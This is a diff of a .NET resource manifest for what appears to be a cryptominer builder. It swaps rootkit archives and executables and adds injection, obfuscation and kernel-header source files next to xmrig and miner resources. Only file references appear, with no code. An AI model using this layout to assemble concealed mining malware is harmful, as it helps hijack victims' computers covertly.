@@ -145,9 +145,6 @@
   <data name="Checker" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Code\Checker.cs;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
   </data>
-  <data name="rootkit_u" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\Rootkit\rootkit-u.zip;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
-  </data>
   <data name="LocalizedControls" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\LocalizedControls.xml;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
   </data>
@@ -156,9 +153,6 @@
   </data>
   <data name="Compilers" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Compilers\Compilers.zip;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
-  </data>
-  <data name="Files" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\Code\Files.zip;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
   <data name="miner" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Code\miner.cpp;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;Windows-1252</value>
@@ -184,10 +178,31 @@
   <data name="nvrtc_builtins64_112" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Miners\nvrtc-builtins64_112.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
-  <data name="rootkit_i" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\Rootkit\rootkit-i.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
-  </data>
   <data name="xmrig" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\Miners\xmrig.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="common.cpp" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Code\Includes\common.cpp;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;Windows-1252</value>
+  </data>
+  <data name="common.h" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Code\Includes\common.h;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;Windows-1252</value>
+  </data>
+  <data name="inject.cpp" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Code\Includes\inject.cpp;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;Windows-1252</value>
+  </data>
+  <data name="inject.h" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Code\Includes\inject.h;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;Windows-1252</value>
+  </data>
+  <data name="ntddk.h" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Code\Includes\ntddk.h;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;Windows-1252</value>
+  </data>
+  <data name="obfuscateu.h" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Code\Includes\obfuscateu.h;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;Windows-1252</value>
+  </data>
+  <data name="Service64" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Rootkit\Service64.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </data>
+  <data name="Uninstall64" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\Rootkit\Uninstall64.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
 </root>
